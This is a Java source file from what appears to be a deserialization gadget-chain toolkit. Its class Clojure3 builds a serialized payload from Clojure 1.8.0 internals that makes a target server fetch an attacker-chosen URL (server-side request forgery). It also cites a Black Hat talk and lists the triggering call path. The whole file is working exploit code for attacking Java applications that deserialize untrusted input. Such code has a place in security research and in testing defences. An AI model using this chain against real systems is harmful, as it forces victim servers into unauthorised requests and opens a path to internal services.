package org.ses.gadgetbuilder.chains2;

import clojure.core$partition_all$fn__7037$fn__7038;
import clojure.java.io$fn__9524;
import clojure.lang.IFn;
import clojure.lang.Iterate;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Constructor;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 * https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf
 *
 */

@Authors({Authors.KCHAI, Authors.LZHANG, Authors.YONGTAO})
@Impact(Impact.SSRF)
@Dependencies({"org.clojure:clojure:1.8.0"})
public class Clojure3 extends GadgetChain<HashCodeTrampoline> {

    private Iterate iter;
    private URL url;

    public Clojure3(HashCodeTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        this.url = new URL(command);

        List fnArry = new ArrayList();
        fnArry.add(url);

        Object evilFn = new core$partition_all$fn__7037$fn__7038(fnArry,111L,new io$fn__9524());
        Constructor iteratorConstructor = Iterate.class.getDeclaredConstructor(IFn.class, Object.class, Object.class);
        iteratorConstructor.setAccessible(true);
        this.iter = (Iterate) iteratorConstructor.newInstance(evilFn, url, url);

        return new TrampolineConnector(iter);
    }

    @Override
    protected void postProcessPayload() throws Exception {
        Reflections.setFieldValue(iter, "prevSeed", url);
        Reflections.setFieldValue(iter, "_seed", url);
    }


    @Override
    protected String getStackTrace() {
        return "clojure.lang.Aseq.hashCode()I (0)\n" +
                "clojure.lang.Iterate.first()\n" +
                "clojure.core$partition_all$fn__7037$fn__7038.invoke(java.lang.Object)\n" +
                "clojure.java.io$fn__9524.invoke(java.lang.Object,java.lang.Object)\n" +
                "clojure.java.io$fn__9524.invokeStatic(java.lang.Object,java.lang.Object)\n" +
                "java.net.URL.openStream()";
    }
}
